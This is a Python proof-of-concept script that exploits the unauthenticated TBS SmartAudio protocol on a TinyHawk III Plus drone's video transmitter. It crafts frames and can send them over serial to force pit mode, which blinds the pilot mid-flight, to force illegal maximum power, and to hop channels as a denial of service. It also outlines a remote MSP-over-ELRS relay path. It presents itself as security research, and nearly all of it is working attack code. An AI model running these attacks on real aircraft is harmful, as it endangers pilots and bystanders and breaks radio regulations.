#!/usr/bin/env python3
"""
TBS SmartAudio VTX Control PoC — unauthenticated video transmitter manipulation

Demonstrates that TBS SmartAudio protocol (used on the TinyHawk III Plus
UART2 VTX connection) has NO authentication — commands are protected only
by a CRC-8 checksum. Any entity on the serial bus can:

  - Change VTX frequency (move to any 5.8 GHz channel)
  - Change TX power (0 mW pit mode through 800+ mW)
  - Enable/disable pit mode (RF output on/off)
  - Read VTX settings (frequency, power, band/channel, mode)

On the TinyHawk III Plus, UART2 is directly connected to the VTX. This
UART is reachable from the FC, which means any MSP command path that can
write to a serial port (including MSP-over-ELRS) could potentially relay
SmartAudio commands to the VTX.

SmartAudio protocol (v2.1):
  Frame: [0xAA] [0x55] [cmd] [length] [data...] [CRC-8]
  CRC-8: polynomial 0xD5 over cmd + length + data
  Commands:
    0x01 GET_SETTINGS  — read current VTX config
    0x02 SET_POWER     — set TX power level
    0x03 SET_CHANNEL   — set frequency channel
    0x04 SET_FREQUENCY — set exact frequency in MHz
    0x05 SET_MODE      — set operating mode (pit/active/etc.)
    0x09 SET_POWER_DB  — set power in dBm (SA v2.1+)

Usage:
  # Dry-run: show crafted frames for all attacks
  python3 smartaudio-control.py --scenario all

  # Read VTX settings (serial)
  python3 smartaudio-control.py --target serial:COM4 --scenario read --execute

  # Force pit mode (disable VTX RF output)
  python3 smartaudio-control.py --target serial:COM4 --scenario pit-mode --execute

  # Change frequency to 5600 MHz
  python3 smartaudio-control.py --target serial:COM4 \\
      --scenario set-freq --freq 5600 --execute

For authorized security research and CTF use only.
"""

import argparse
import os
import struct
import sys
import time
from typing import Optional

_TOOLS_DIR = os.path.dirname(os.path.abspath(__file__))
if _TOOLS_DIR not in sys.path:
    sys.path.insert(0, _TOOLS_DIR)


# ---------------------------------------------------------------------------
# SmartAudio protocol constants
# ---------------------------------------------------------------------------

SA_SYNC1 = 0xAA
SA_SYNC2 = 0x55

# SmartAudio commands
SA_CMD_GET_SETTINGS = 0x01      # Read VTX settings (v1)
SA_CMD_SET_POWER = 0x02         # Set power level (index)
SA_CMD_SET_CHANNEL = 0x03       # Set band/channel
SA_CMD_SET_FREQUENCY = 0x04     # Set exact frequency in MHz
SA_CMD_SET_MODE = 0x05          # Set mode (pit, active, unlock, etc.)
SA_CMD_GET_SETTINGS_V2 = 0x09  # Read settings (SA v2)
SA_CMD_SET_POWER_DB = 0x0B     # Set power in dBm (SA v2.1+)

# SmartAudio response marker (command | 0x01 for responses)
SA_RESP_FLAG = 0x01

# Power level definitions (common VTX power tables)
SA_POWER_LEVELS = {
    0: "PIT (0 mW)",
    1: "25 mW",
    2: "100 mW",  # or 200 mW depending on VTX
    3: "400 mW",
    4: "800 mW",
}

# SA v2.1 power in dBm
SA_POWER_DBM = {
    0: "PIT (0 dBm)",
    14: "25 mW",
    20: "100 mW",
    23: "200 mW",
    26: "400 mW",
    29: "800 mW",
}

# Mode flags
SA_MODE_PIT_IN_RANGE = 0x01
SA_MODE_PIT_OUT_RANGE = 0x02
SA_MODE_LOCKED = 0x04
SA_MODE_UNLOCKED = 0x08

# 5.8 GHz FPV band/channel table
BANDS = {
    "A": [5865, 5845, 5825, 5805, 5785, 5765, 5745, 5725],
    "B": [5733, 5752, 5771, 5790, 5809, 5828, 5847, 5866],
    "E": [5705, 5685, 5665, 5645, 5885, 5905, 5925, 5945],
    "F": [5740, 5760, 5780, 5800, 5820, 5840, 5860, 5880],
    "R": [5658, 5695, 5732, 5769, 5806, 5843, 5880, 5917],
    "L": [5362, 5399, 5436, 5473, 5510, 5547, 5584, 5621],
}

# Flat channel index (band A=0-7, B=8-15, E=16-23, F=24-31, R=32-39)
CHANNEL_TABLE = []
for band_name in ["A", "B", "E", "F", "R"]:
    CHANNEL_TABLE.extend(BANDS[band_name])


# ---------------------------------------------------------------------------
# CRC-8 (poly 0xD5 — same as CRSF frame CRC)
# ---------------------------------------------------------------------------

def _build_crc8_table(poly: int) -> list[int]:
    table = []
    for i in range(256):
        crc = i
        for _ in range(8):
            crc = ((crc << 1) ^ poly) & 0xFF if crc & 0x80 else (crc << 1) & 0xFF
        table.append(crc)
    return table

CRC8_TABLE = _build_crc8_table(0xD5)


def sa_crc8(data: bytes) -> int:
    crc = 0
    for b in data:
        crc = CRC8_TABLE[crc ^ b]
    return crc


# ---------------------------------------------------------------------------
# Frame construction
# ---------------------------------------------------------------------------

def build_sa_frame(cmd: int, data: bytes = b"") -> bytes:
    """Build a SmartAudio frame: [0xAA][0x55][cmd][len][data...][CRC8]"""
    length = len(data)
    frame_body = bytes([cmd, length]) + data
    crc = sa_crc8(frame_body)
    return bytes([SA_SYNC1, SA_SYNC2]) + frame_body + bytes([crc])


def sa_get_settings() -> bytes:
    """GET_SETTINGS — request current VTX configuration."""
    return build_sa_frame(SA_CMD_GET_SETTINGS)


def sa_get_settings_v2() -> bytes:
    """GET_SETTINGS v2 — request current VTX configuration (SA v2)."""
    return build_sa_frame(SA_CMD_GET_SETTINGS_V2)


def sa_set_power(level: int) -> bytes:
    """SET_POWER — set power level by index (0-4 typical)."""
    return build_sa_frame(SA_CMD_SET_POWER, bytes([level]))


def sa_set_power_dbm(dbm: int) -> bytes:
    """SET_POWER_DB — set power in dBm (SA v2.1+)."""
    return build_sa_frame(SA_CMD_SET_POWER_DB, bytes([dbm]))


def sa_set_channel(channel: int) -> bytes:
    """SET_CHANNEL — set band/channel by flat index."""
    return build_sa_frame(SA_CMD_SET_CHANNEL, bytes([channel]))


def sa_set_frequency(freq_mhz: int) -> bytes:
    """SET_FREQUENCY — set exact frequency in MHz."""
    return build_sa_frame(SA_CMD_SET_FREQUENCY, struct.pack(">H", freq_mhz))


def sa_set_mode(mode: int) -> bytes:
    """SET_MODE — set operating mode flags."""
    return build_sa_frame(SA_CMD_SET_MODE, bytes([mode]))


# ---------------------------------------------------------------------------
# Response parsing
# ---------------------------------------------------------------------------

def parse_sa_response(data: bytes) -> Optional[dict]:
    """Parse a SmartAudio response frame."""
    if len(data) < 5:
        return None

    # Find sync bytes
    start = -1
    for i in range(len(data) - 4):
        if data[i] == SA_SYNC1 and data[i + 1] == SA_SYNC2:
            start = i
            break

    if start < 0:
        return None

    cmd = data[start + 2]
    length = data[start + 3]

    if start + 4 + length + 1 > len(data):
        return None

    payload = data[start + 4 : start + 4 + length]
    crc_received = data[start + 4 + length]
    crc_expected = sa_crc8(data[start + 2 : start + 4 + length])

    result = {
        "cmd": cmd,
        "cmd_name": "RESPONSE" if cmd & SA_RESP_FLAG else "REQUEST",
        "length": length,
        "payload": list(payload),
        "crc_ok": crc_received == crc_expected,
        "raw": list(data[start : start + 5 + length]),
    }

    # Parse GET_SETTINGS response
    if cmd in (SA_CMD_GET_SETTINGS | SA_RESP_FLAG, SA_CMD_GET_SETTINGS_V2 | SA_RESP_FLAG):
        if length >= 4:
            result["channel"] = payload[0]
            result["power_level"] = payload[1]
            result["mode"] = payload[2]
            result["frequency_mhz"] = (payload[3] << 8) | payload[4] if length >= 5 else None

            if result["channel"] < len(CHANNEL_TABLE):
                band_idx = result["channel"] // 8
                ch_idx = result["channel"] % 8
                band_names = ["A", "B", "E", "F", "R"]
                if band_idx < len(band_names):
                    result["band_channel"] = f"{band_names[band_idx]}{ch_idx + 1}"

            result["power_label"] = SA_POWER_LEVELS.get(
                payload[1], f"Level {payload[1]}"
            )
            mode_flags = []
            if payload[2] & SA_MODE_PIT_IN_RANGE:
                mode_flags.append("PIT_IN_RANGE")
            if payload[2] & SA_MODE_PIT_OUT_RANGE:
                mode_flags.append("PIT_OUT_RANGE")
            if payload[2] & SA_MODE_LOCKED:
                mode_flags.append("LOCKED")
            if payload[2] & SA_MODE_UNLOCKED:
                mode_flags.append("UNLOCKED")
            result["mode_flags"] = mode_flags

    return result


# ---------------------------------------------------------------------------
# Attack scenarios
# ---------------------------------------------------------------------------

SCENARIOS = {
    "read": {
        "name": "Read VTX Settings",
        "description": (
            "Queries the VTX for its current frequency, power level, "
            "and operating mode. Read-only reconnaissance."
        ),
        "frames": lambda args: [
            ("GET_SETTINGS", sa_get_settings()),
            ("GET_SETTINGS_V2", sa_get_settings_v2()),
        ],
    },
    "pit-mode": {
        "name": "Force Pit Mode (Disable RF)",
        "description": (
            "Forces the VTX into pit mode, killing RF output. The pilot "
            "loses video feed. If flying FPV with goggles, this is "
            "equivalent to blindfolding the pilot mid-flight."
        ),
        "frames": lambda args: [
            ("SET_POWER → PIT (0 mW)", sa_set_power(0)),
            ("SET_MODE → PIT_IN_RANGE", sa_set_mode(SA_MODE_PIT_IN_RANGE)),
        ],
    },
    "max-power": {
        "name": "Force Maximum Power",
        "description": (
            "Forces VTX to maximum power output. May violate local RF "
            "regulations (>25 mW illegal in many jurisdictions without "
            "HAM license), cause VTX overheating, and interfere with "
            "other pilots' video feeds."
        ),
        "frames": lambda args: [
            ("SET_POWER → 800 mW (max)", sa_set_power(4)),
            ("SET_MODE → UNLOCKED", sa_set_mode(SA_MODE_UNLOCKED)),
        ],
    },
    "channel-hop": {
        "name": "Force Channel Change",
        "description": (
            "Changes the VTX frequency. The pilot's goggles are tuned "
            "to the original frequency, so the video feed is lost. "
            "Unlike pit mode, the VTX is still transmitting — on a "
            "frequency nobody is watching."
        ),
        "frames": lambda args: [
            ("SET_CHANNEL → R8 (5917 MHz)", sa_set_channel(39)),
        ],
    },
    "set-freq": {
        "name": "Set Exact Frequency",
        "description": (
            "Sets the VTX to an arbitrary frequency in MHz. Can be used "
            "to move to an out-of-band or restricted frequency."
        ),
        "frames": lambda args: [
            (f"SET_FREQUENCY → {args.freq} MHz", sa_set_frequency(args.freq)),
        ],
    },
    "rapid-hop": {
        "name": "Rapid Channel Hopping (Denial of Service)",
        "description": (
            "Rapidly cycles through all channels. The VTX spends most "
            "of its time re-tuning and the video feed is unwatchable. "
            "This is a denial-of-service attack on the FPV video link."
        ),
        "frames": lambda args: [
            (f"SET_CHANNEL → {i} ({CHANNEL_TABLE[i]} MHz)", sa_set_channel(i))
            for i in range(0, 40, 5)  # Every 5th channel
        ],
    },
}


def build_scenario_frames(scenario_key: str, args) -> list[tuple[str, bytes]]:
    return SCENARIOS[scenario_key]["frames"](args)


# ---------------------------------------------------------------------------
# Frame analysis
# ---------------------------------------------------------------------------

def hex_dump(data: bytes) -> str:
    return " ".join(f"{b:02x}" for b in data)


def analyze_frame(desc: str, frame: bytes, index: int):
    print(f"  Frame {index}: {desc}")
    print(f"    Hex:  {hex_dump(frame)}")
    print(f"    Len:  {len(frame)} bytes")

    if len(frame) >= 4 and frame[0] == SA_SYNC1 and frame[1] == SA_SYNC2:
        cmd = frame[2]
        length = frame[3]
        data = frame[4:4 + length]
        crc = frame[4 + length] if len(frame) > 4 + length else None

        cmd_names = {
            0x01: "GET_SETTINGS",
            0x02: "SET_POWER",
            0x03: "SET_CHANNEL",
            0x04: "SET_FREQUENCY",
            0x05: "SET_MODE",
            0x09: "GET_SETTINGS_V2",
            0x0B: "SET_POWER_DB",
        }
        cmd_name = cmd_names.get(cmd, f"UNKNOWN(0x{cmd:02x})")
        print(f"    SA:   cmd=0x{cmd:02x} ({cmd_name}) data_len={length}")
        if data:
            print(f"    Data: {hex_dump(data)}")
        if crc is not None:
            expected = sa_crc8(bytes([cmd, length]) + data)
            valid = "OK" if crc == expected else "INVALID"
            print(f"    CRC:  0x{crc:02x} ({valid})")
    print()


# ---------------------------------------------------------------------------
# MSP relay analysis
# ---------------------------------------------------------------------------

# MSP_SET_SERIAL_PASSTHROUGH (0xF4 / 244) could relay SA commands via FC
MSP_HEADER = b"$M"
MSP_DIR_TO_FC = b"<"
MSP_SET_SERIAL_CONFIG = 215    # MSP_SET_CF_SERIAL_CONFIG
MSP_SET_VTX_CONFIG = 88       # MSP_SET_VTX_CONFIG (direct VTX control via MSP)
# Betaflight MSP_SET_VTX_CONFIG changes the VTX settings through the FC's
# vtxTable, which then issues SmartAudio commands on UART2.


def msp_checksum(data: bytes) -> int:
    crc = 0
    for b in data:
        crc ^= b
    return crc


def build_msp_command(cmd: int, payload: bytes = b"") -> bytes:
    body = bytes([len(payload), cmd]) + payload
    return MSP_HEADER + MSP_DIR_TO_FC + body + bytes([msp_checksum(body)])


def msp_set_vtx_config(freq_mhz: int = 0, power: int = 0, pit_mode: int = 0,
                        band: int = 0, channel: int = 0) -> bytes:
    """Build MSP_SET_VTX_CONFIG — the FC-mediated path to SmartAudio.

    This is the OTA-reachable path: MSP-over-ELRS → FC → SmartAudio → VTX.
    No additional authentication is added by any layer in this chain.
    """
    payload = struct.pack("<HBBBB", freq_mhz, band, channel, power, pit_mode)
    return build_msp_command(MSP_SET_VTX_CONFIG, payload)


# ---------------------------------------------------------------------------
# Transport
# ---------------------------------------------------------------------------

class SaTransport:
    def __init__(self, target: Optional[str] = None):
        self.target = target
        self.serial_port = None

    def connect(self):
        if not self.target:
            return
        port = self.target
        if port.startswith("serial:"):
            port = port[7:]
        import serial
        # SmartAudio uses half-duplex on a single wire at 4800 baud
        self.serial_port = serial.Serial(port, 4800, timeout=1)

    def send(self, data: bytes):
        if self.serial_port:
            self.serial_port.write(data)

    def recv(self, size: int = 64) -> bytes:
        if self.serial_port:
            return self.serial_port.read(size)
        return b""

    def close(self):
        if self.serial_port:
            self.serial_port.close()


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(
        description="TBS SmartAudio VTX Control PoC"
    )
    parser.add_argument(
        "--target",
        help="Serial port: serial:COMn or serial:/dev/ttyUSBn",
    )
    parser.add_argument(
        "--scenario",
        choices=list(SCENARIOS.keys()) + ["all"],
        help="Attack scenario to execute",
    )
    parser.add_argument(
        "--freq", type=int, default=5600,
        help="Frequency in MHz for set-freq scenario (default: 5600)",
    )
    parser.add_argument(
        "--execute", action="store_true",
        help="Actually send frames (default is dry-run analysis)",
    )
    parser.add_argument(
        "--show-msp-path", action="store_true",
        help="Show MSP_SET_VTX_CONFIG frames (OTA attack path via FC)",
    )
    parser.add_argument(
        "-o", "--output",
        help="Output JSON file with frame data",
    )
    args = parser.parse_args()

    if not args.scenario:
        parser.error("Specify --scenario")

    print("TBS SmartAudio VTX Control PoC")
    print(f"Mode: {'EXECUTE' if args.execute else 'DRY-RUN (analysis only)'}")
    if args.target:
        print(f"Target: {args.target}")
    print()

    # Build sequences
    if args.scenario == "all":
        scenario_keys = [k for k in SCENARIOS if k != "set-freq"]
    else:
        scenario_keys = [args.scenario]

    output_data = {"scenarios": [], "execute": args.execute}

    for key in scenario_keys:
        scenario = SCENARIOS[key]
        frames = build_scenario_frames(key, args)

        print(f"{'=' * 60}")
        print(f"Scenario: {scenario['name']}")
        print(f"{'=' * 60}")
        print(f"Description: {scenario['description']}")
        print(f"Frames: {len(frames)}")
        print()

        scenario_output = {
            "key": key,
            "name": scenario["name"],
            "frames": [],
        }

        for i, (desc, frame) in enumerate(frames):
            analyze_frame(desc, frame, i + 1)
            scenario_output["frames"].append({
                "description": desc,
                "hex": hex_dump(frame),
                "bytes": list(frame),
            })

        output_data["scenarios"].append(scenario_output)

    # Show MSP path analysis
    if args.show_msp_path:
        print(f"\n{'=' * 60}")
        print("MSP_SET_VTX_CONFIG — OTA Attack Path")
        print(f"{'=' * 60}")
        print("The FC-mediated path: ELRS → CRSF → MSP → FC → SmartAudio → VTX")
        print("No authentication at any layer in this chain.\n")

        msp_frames = [
            ("Set VTX to pit mode (via MSP)",
             msp_set_vtx_config(pit_mode=1)),
            ("Set VTX to 5600 MHz (via MSP)",
             msp_set_vtx_config(freq_mhz=5600)),
            ("Set VTX to max power (via MSP)",
             msp_set_vtx_config(power=4)),
        ]

        for i, (desc, frame) in enumerate(msp_frames):
            print(f"  Frame {i + 1}: {desc}")
            print(f"    MSP Hex: {hex_dump(frame)}")
            print()

    # Execute
    if args.execute:
        if not args.target:
            print("ERROR: --execute requires --target")
            return 1

        transport = SaTransport(args.target)
        try:
            print(f"\nConnecting to {args.target}...")
            transport.connect()
            print("Connected (4800 baud, half-duplex).\n")

            for key in scenario_keys:
                scenario = SCENARIOS[key]
                frames = build_scenario_frames(key, args)
                print(f"Executing: {scenario['name']}")

                for desc, frame in frames:
                    transport.send(frame)
                    print(f"  Sent: {desc}")
                    time.sleep(0.1)  # SA needs inter-frame gap

                    resp = transport.recv(64)
                    if resp:
                        print(f"  Response: {hex_dump(resp)}")
                        parsed = parse_sa_response(resp)
                        if parsed:
                            print(f"  Parsed: {parsed}")

            print("\nExecution complete.")

        except Exception as e:
            print(f"ERROR: {e}")
            return 1
        finally:
            transport.close()
    else:
        print(f"\n{'=' * 60}")
        print("DRY-RUN COMPLETE — no frames were sent.")
        print(f"{'=' * 60}")
        print("\nTo execute on serial: add --execute --target serial:COMn")
        print("To see MSP OTA path: add --show-msp-path")

    # Assessment
    print(f"\n{'=' * 60}")
    print("VULNERABILITY ASSESSMENT")
    print(f"{'=' * 60}")
    print("  Protocol:    TBS SmartAudio v2.1 (half-duplex, 4800 baud)")
    print("  Auth:        NONE — CRC-8 checksum only (integrity, not auth)")
    print("  Encryption:  NONE — commands in plaintext")
    print("  Access:      UART2 (direct wire) or via FC MSP_SET_VTX_CONFIG")
    print("  OTA path:    MSP-over-ELRS → FC → SmartAudio → VTX (no auth)")
    print()
    print("  Impact: Any entity on the SmartAudio bus, or any MSP command")
    print("  source, can change VTX frequency, power, and pit mode. This")
    print("  enables video feed disruption (channel change/pit mode),")
    print("  regulatory violations (max power), and denial of service")
    print("  (rapid channel hopping).")
    print()
    print("  TinyHawk III Plus specifics:")
    print("    - UART2 = SmartAudio (confirmed via serial topology)")
    print("    - FC can relay SmartAudio via MSP_SET_VTX_CONFIG")
    print("    - MSP-over-ELRS is the OTA entry point")
    print("    - Complete chain: radio → ELRS → CRSF → MSP → SmartAudio")

    if args.output:
        import json
        with open(args.output, "w") as f:
            json.dump(output_data, f, indent=2)
        print(f"\nFrame data written to {args.output}")

    return 0


if __name__ == "__main__":
    sys.exit(main())
